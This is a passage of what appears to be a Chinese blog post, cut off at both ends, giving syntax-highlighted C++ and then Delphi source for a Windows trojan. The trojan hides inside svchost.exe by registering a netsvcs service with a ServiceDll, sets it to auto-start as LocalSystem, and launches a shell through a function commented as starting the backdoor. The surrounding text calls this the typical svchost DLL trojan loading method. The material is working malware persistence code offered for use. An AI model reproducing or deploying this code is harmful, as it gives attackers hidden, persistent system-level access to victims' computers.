class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;</span>, stServiceCfg.szSvcName, rc);</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">LogToFile</span>(<span class=\"string\">&quot;RegSetValueEx&quot;</span>);</span><br><span class=\"line\">  DWORD dwValue = <span class=\"number\">3</span>;<span class=\"comment\">//manule start</span></span><br><span class=\"line\">  rc = <span class=\"built_in\">RegSetValueEx</span>(hKey, <span class=\"string\">&quot;Start&quot;</span>, <span class=\"number\">0</span>, REG_DWORD, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)&amp;dwValue, <span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\">  <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegSetValueEx(start)&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">////////////////////</span></span><br><span class=\"line\">  <span class=\"type\">char</span> szDllPath[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(szDllPath, <span class=\"string\">&quot;%SystemRoot%\\\\System32\\\\qmgr.dll&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">strcat</span>(buff, <span class=\"string\">&quot;\\\\Parameters&quot;</span>);</span><br><span class=\"line\">  rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, buff, <span class=\"number\">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;</span>, stServiceCfg.szSvcName, rc);</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  rc = <span class=\"built_in\">RegSetValueEx</span>(hKey, <span class=\"string\">&quot;ServiceDll&quot;</span>, <span class=\"number\">0</span>, REG_EXPAND_SZ, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)szDllPath, <span class=\"built_in\">strlen</span>(szDllPath)<span class=\"number\">+1</span>);</span><br><span class=\"line\">  <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegSetValueEx(ServiceDll)&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RecoverService(%s) SUCCESS.&quot;</span>, stServiceCfg.szSvcName);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">catch</span>(<span class=\"type\">char</span> *str)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(str &amp;&amp; str[<span class=\"number\">0</span>])</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">LogToFile</span>(str);</span><br><span class=\"line\">    rc = <span class=\"built_in\">GetLastError</span>();</span><br><span class=\"line\">    <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;%s error %d&quot;</span>, str, rc);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码</span></span><br><span class=\"line\"><span class=\"comment\">//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forum</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">ControlService</span>(SERVICE_CONTROL_STOP);</span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">InstallService</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"comment\">// Open a handle to the SC Manager database. </span></span><br><span class=\"line\"> <span class=\"type\">int</span> rc = <span class=\"number\">0</span>;</span><br><span class=\"line\"> HKEY hKey, hkParam = <span class=\"number\">0</span>;</span><br><span class=\"line\"> SC_HANDLE hscm = <span class=\"literal\">NULL</span>, schService = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> buff[<span class=\"number\">500</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//query svchost setting</span></span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr, *pSvchost = <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost&quot;</span>;</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, pSvchost, <span class=\"number\">0</span>, KEY_QUERY_VALUE, &amp;hKey);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.&quot;</span>, pSvchost, rc); </span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> DWORD type, size = <span class=\"keyword\">sizeof</span> buff;</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegQueryValueEx</span>(hKey, <span class=\"string\">&quot;netsvcs&quot;</span>, <span class=\"number\">0</span>, &amp;type, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)buff, &amp;size);</span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegQueryValueEx(Svchost\\\\netsvcs)&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">for</span>(ptr = buff; *ptr; ptr = <span class=\"built_in\">strchr</span>(ptr, <span class=\"number\">0</span>)<span class=\"number\">+1</span>)</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"built_in\">stricmp</span>(ptr, stServiceCfg.szSvcName) == <span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span>(*ptr == <span class=\"number\">0</span>)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;you specify service name not in Svchost\\\\netsvcs, must be one of following:&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">for</span>(ptr = buff; *ptr; ptr = <span class=\"built_in\">strchr</span>(ptr, <span class=\"number\">0</span>)<span class=\"number\">+1</span>)</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot; - %s&quot;</span>, ptr); </span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//create service</span></span><br><span class=\"line\"> hscm = <span class=\"built_in\">OpenSCManager</span>(<span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (hscm == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;OpenSCManager()&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"type\">char</span> *bin = <span class=\"string\">&quot;%SystemRoot%\\\\system32\\\\svchost.exe -k netsvcs&quot;</span>;</span><br><span class=\"line\"> schService = <span class=\"built_in\">CreateService</span>( </span><br><span class=\"line\"> hscm, <span class=\"comment\">// SCManager database </span></span><br><span class=\"line\"> stServiceCfg.szSvcName, <span class=\"comment\">// name of service </span></span><br><span class=\"line\"> stServiceCfg.szSvcName, <span class=\"comment\">// service name to display </span></span><br><span class=\"line\"> SERVICE_ALL_ACCESS, <span class=\"comment\">// desired access </span></span><br><span class=\"line\"> SERVICE_WIN32_SHARE_PROCESS, <span class=\"comment\">// service type </span></span><br><span class=\"line\"> SERVICE_AUTO_START, <span class=\"comment\">// start type </span></span><br><span class=\"line\"> SERVICE_ERROR_NORMAL, <span class=\"comment\">// error control type </span></span><br><span class=\"line\"> bin, <span class=\"comment\">// service&#x27;s binary </span></span><br><span class=\"line\"> <span class=\"literal\">NULL</span>, <span class=\"comment\">// no load ordering group </span></span><br><span class=\"line\"> <span class=\"literal\">NULL</span>, <span class=\"comment\">// no tag identifier </span></span><br><span class=\"line\"> <span class=\"literal\">NULL</span>, <span class=\"comment\">// no dependencies </span></span><br><span class=\"line\"> <span class=\"literal\">NULL</span>, <span class=\"comment\">// LocalSystem account </span></span><br><span class=\"line\"> <span class=\"literal\">NULL</span>); <span class=\"comment\">// no password </span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (schService == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;CreateService(%s) error %d&quot;</span>, stServiceCfg.szSvcName, rc = <span class=\"built_in\">GetLastError</span>());</span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;CreateService(%s) SUCCESS. Config it path %s&quot;</span>, stServiceCfg.szSvcName, bin); </span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(schService); </span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(hscm); </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//config service</span></span><br><span class=\"line\"> <span class=\"built_in\">strncpy</span>(buff, <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;</span>, <span class=\"keyword\">sizeof</span> buff);</span><br><span class=\"line\"> <span class=\"built_in\">strncat</span>(buff, stServiceCfg.szSvcName, <span class=\"number\">100</span>);</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, buff, <span class=\"number\">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;</span>, stServiceCfg.szSvcName, rc); </span><br><span class=\"line\">  <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> rc = <span class=\"built_in\">RegCreateKey</span>(hKey, <span class=\"string\">&quot;Parameters&quot;</span>, &amp;hkParam);</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegCreateKey(Parameters)&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"built_in\">GetModuleFileName</span>(<span class=\"built_in\">HMODULE</span>(hDll), buff, <span class=\"keyword\">sizeof</span> buff))</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;GetModuleFileName() get dll path&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> rc = <span class=\"built_in\">RegSetValueEx</span>(hkParam, <span class=\"string\">&quot;ServiceDll&quot;</span>, <span class=\"number\">0</span>, REG_EXPAND_SZ, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)buff, <span class=\"built_in\">strlen</span>(buff)<span class=\"number\">+1</span>);</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegSetValueEx(ServiceDll)&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;Config service %s ok.&quot;</span>, stServiceCfg.szSvcName); </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">catch</span>(<span class=\"type\">char</span> *str)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(str &amp;&amp; str[<span class=\"number\">0</span>])</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    rc = <span class=\"built_in\">GetLastError</span>();</span><br><span class=\"line\">    <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;%s error %d&quot;</span>, str, rc);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hkParam);</span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(schService); </span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(hscm); </span><br><span class=\"line\"><span class=\"comment\">//说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码</span></span><br><span class=\"line\"><span class=\"comment\">//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forum</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//启动服务</span></span><br><span class=\"line\"> <span class=\"built_in\">ControlService</span>(SERVICE_CONTROL_CONTINUE);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> rc;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">UninstallService</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"type\">int</span> rc = <span class=\"number\">0</span>;</span><br><span class=\"line\"> SC_HANDLE schService;</span><br><span class=\"line\"> SC_HANDLE hscm;</span><br><span class=\"line\"> </span><br><span class=\"line\"> __try&#123;</span><br><span class=\"line\"> hscm = <span class=\"built_in\">OpenSCManager</span>(<span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (hscm == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;OpenSCManager() error %d&quot;</span>, rc = <span class=\"built_in\">GetLastError</span>() ); </span><br><span class=\"line\"> <span class=\"keyword\">return</span> rc;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> schService = <span class=\"built_in\">OpenService</span>(hscm, stServiceCfg.szSvcName, DELETE);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (schService == <span class=\"literal\">NULL</span>) </span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;OpenService(%s) error %d&quot;</span>, stServiceCfg.szSvcName, rc = <span class=\"built_in\">GetLastError</span>() ); </span><br><span class=\"line\"> <span class=\"keyword\">return</span> rc;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!<span class=\"built_in\">DeleteService</span>(schService) ) </span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;OpenService(%s) error %d&quot;</span>, stServiceCfg.szSvcName, rc = <span class=\"built_in\">GetLastError</span>() ); </span><br><span class=\"line\"> <span class=\"keyword\">return</span> rc;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;DeleteService(%s) SUCCESS.&quot;</span>, stServiceCfg.szSvcName); </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> __except(<span class=\"number\">1</span>)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;Exception Catched 0x%X&quot;</span>, <span class=\"built_in\">GetExceptionCode</span>());</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(schService); </span><br><span class=\"line\"> <span class=\"built_in\">CloseServiceHandle</span>(hscm);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">ControlService</span>(SERVICE_CONTROL_STOP);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> rc;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ServiceMain</span><span class=\"params\">( <span class=\"type\">int</span> argc, <span class=\"type\">wchar_t</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> svcname[<span class=\"number\">256</span>];</span><br><span class=\"line\"> <span class=\"built_in\">strncpy</span>(svcname, (<span class=\"type\">char</span>*)argv[<span class=\"number\">0</span>], <span class=\"keyword\">sizeof</span> svcname); <span class=\"comment\">//it&#x27;s should be unicode, but if it&#x27;s ansi we do it well</span></span><br><span class=\"line\"> <span class=\"built_in\">wcstombs</span>(svcname, argv[<span class=\"number\">0</span>], <span class=\"keyword\">sizeof</span> svcname);</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceMain(%d, %s) called&quot;</span>, argc, svcname);</span><br><span class=\"line\"> </span><br><span class=\"line\"> hSrv = <span class=\"built_in\">RegisterServiceCtrlHandler</span>( svcname, (LPHANDLER_FUNCTION)ServiceHandler );</span><br><span class=\"line\"> <span class=\"keyword\">if</span>( hSrv == <span class=\"literal\">NULL</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: RegisterServiceCtrlHandler %S failed&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_START_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> );</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_RUNNING, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">StartShell</span>();<span class=\"comment\">//启动后门dream2fly.net</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceMain done&quot;</span>);</span><br><span class=\"line\"> <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">TellSCM</span><span class=\"params\">( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> SERVICE_STATUS srvStatus;</span><br><span class=\"line\"> srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class=\"line\"> srvStatus.dwCurrentState = dwCurrState = dwState;</span><br><span class=\"line\"> srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class=\"line\"> srvStatus.dwWin32ExitCode = dwExitCode;</span><br><span class=\"line\"> srvStatus.dwServiceSpecificExitCode = <span class=\"number\">0</span>;</span><br><span class=\"line\"> srvStatus.dwCheckPoint = dwProgress;</span><br><span class=\"line\"> srvStatus.dwWaitHint = <span class=\"number\">3000</span>;</span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"built_in\">SetServiceStatus</span>( hSrv, &amp;srvStatus );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> __stdcall <span class=\"title\">ServiceHandler</span><span class=\"params\">( DWORD dwCommand )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"comment\">// not really necessary because the service stops quickly</span></span><br><span class=\"line\"> <span class=\"keyword\">switch</span>( dwCommand )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">case</span> SERVICE_CONTROL_STOP:</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_STOP_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> );</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_STOP&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">Sleep</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_STOPPED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"keyword\">case</span> SERVICE_CONTROL_PAUSE:</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_PAUSE_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> );</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_PAUSE&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_PAUSED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"keyword\">case</span> SERVICE_CONTROL_CONTINUE:</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_CONTINUE_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> );</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_CONTINUE&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_RUNNING, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"keyword\">case</span> SERVICE_CONTROL_INTERROGATE:</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_INTERROGATE&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( dwCurrState, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"keyword\">case</span> SERVICE_CONTROL_SHUTDOWN:</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: ServiceHandler called SERVICE_CONTROL_SHUTDOWN&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">TellSCM</span>( SERVICE_STOPPED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\"> <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">Parsed in <span class=\"number\">0.156</span> seconds</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Delphi版本源代码</span><br><span class=\"line\">典型的Svchost启动DLL木马方式,黑洞和小熊都用了这种启动方式....</span><br><span class=\"line\"></span><br><span class=\"line\">library ServiceDll;</span><br><span class=\"line\">　</span><br><span class=\"line\">　uses</span><br><span class=\"line\">　 SysUtils,</span><br><span class=\"line\">　 Classes,</span><br><span class=\"line\">　 winsvc,</span><br><span class=\"line\">　 System,</span><br><span class=\"line\">　 Windows;</span><br><span class=\"line\">　</span><br><span class=\"line\">　&#123; 定义全局变量 &#125;</span><br><span class=\"line\">　var</span><br><span class=\"line\">　 SvcStatsHandle : SERVICE_STATUS_HANDLE;</span><br><span class=\"line\">　 dwCurrState : DWORD;</span><br><span class=\"line\">　 ServiceName : PChar = <span class=\"string\">&#x27;BITS&#x27;</span>;</span><br><span class=\"line\">　</span><br><span class=\"line\">　&#123; 调试函数,用于输出调试文本 &#125;</span><br><span class=\"line\">　<span class=\"function\">procedure <span class=\"title\">OutPutText</span><span class=\"params\">(CH:PChar)</span></span>;</span><br><span class=\"line\">　var</span><br><span class=\"line\">　 FileHandle: TextFile;</span><br><span class=\"line\">　 F : Integer;</span><br><span class=\"line\">　<span class=\"function\">Begin</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"keyword\">try</span></span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"title\">FileExists</span><span class=\"params\">(<span class=\"string\">&#x27;zztestdll.txt&#x27;</span>)</span> then</span></span><br><span class=\"line\"><span class=\"function\">　 F :=</span> <span class=\"built_in\">FileCreate</span>(<span class=\"string\">&#x27;zztestdll.txt&#x27;</span>);</span><br><span class=\"line\">　 finally</span><br><span class=\"line\">　 <span class=\"keyword\">if</span> F &gt; <span class=\"number\">0</span> <span class=\"function\">Then <span class=\"title\">FileClose</span><span class=\"params\">(F)</span></span>;</span><br><span class=\"line\">　 end;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 <span class=\"built_in\">AssignFile</span>(FileHandle,<span class=\"string\">&#x27;zztestdll.txt&#x27;</span>);</span><br><span class=\"line\">　 <span class=\"built_in\">Append</span>(FileHandle);</span><br><span class=\"line\">　 <span class=\"built_in\">Writeln</span>(FileHandle,CH);</span><br><span class=\"line\">　 <span class=\"built_in\">Flush</span>(FileHandle);</span><br><span class=\"line\">　 <span class=\"built_in\">CloseFile</span>(FileHandle);</span><br><span class=\"line\">　END;</span><br><span class=\"line\">　</span><br><span class=\"line\"><span class=\"function\">procedure <span class=\"title\">DLLEntryPoint</span><span class=\"params\">(dwReason : DWord)</span></span>;</span><br><span class=\"line\">　begin</span><br><span class=\"line\">　</span><br><span class=\"line\">　 <span class=\"keyword\">case</span> dwReason of</span><br><span class=\"line\">　 DLL_PROCESS_ATTACH:</span><br><span class=\"line\">　 ;</span><br><span class=\"line\">　 DLL_PROCESS_DETACH:</span><br><span class=\"line\">　 ;</span><br><span class=\"line\">　 DLL_THREAD_ATTACH:</span><br><span class=\"line\">　 ;</span><br><span class=\"line\">　 DLL_THREAD_DETACH:</span><br><span class=\"line\">　 ;</span><br><span class=\"line\">　 end;</span><br><span class=\"line\">　end;</span><br><span class=\"line\">　</span><br><span class=\"line\">　<span class=\"function\">function <span class=\"title\">TellSCM</span><span class=\"params\">(dwState : DWORD ; dwExitCode : DWORD; dwProgress : DWORD )</span>: LongBool;</span></span><br><span class=\"line\">　var</span><br><span class=\"line\">　 srvStatus : service_status;</span><br><span class=\"line\">　BEGIN</span><br><span class=\"line\">　 srvStatus.dwServiceType := SERVICE_WIN32_SHARE_PROCESS;</span><br><span class=\"line\">　 dwCurrState := dwState;</span><br><span class=\"line\">　 srvStatus.dwCurrentState := dwState;</span><br><span class=\"line\">　 srvStatus.dwControlsAccepted := SERVICE_ACCEPT_STOP <span class=\"keyword\">or</span> SERVICE_ACCEPT_PAUSE_CONTINUE <span class=\"keyword\">or</span> SERVICE_ACCEPT_SHUTDOWN;</span><br><span class=\"line\">　 srvStatus.dwWin32ExitCode := dwExitCode;</span><br><span class=\"line\">　 srvStatus.dwServiceSpecificExitCode := <span class=\"number\">0</span>;</span><br><span class=\"line\">　 srvStatus.dwCheckPoint := dwProgress;</span><br><span class=\"line\">　 srvStatus.dwWaitHint := <span class=\"number\">3000</span>;</span><br><span class=\"line\">　 Result := <span 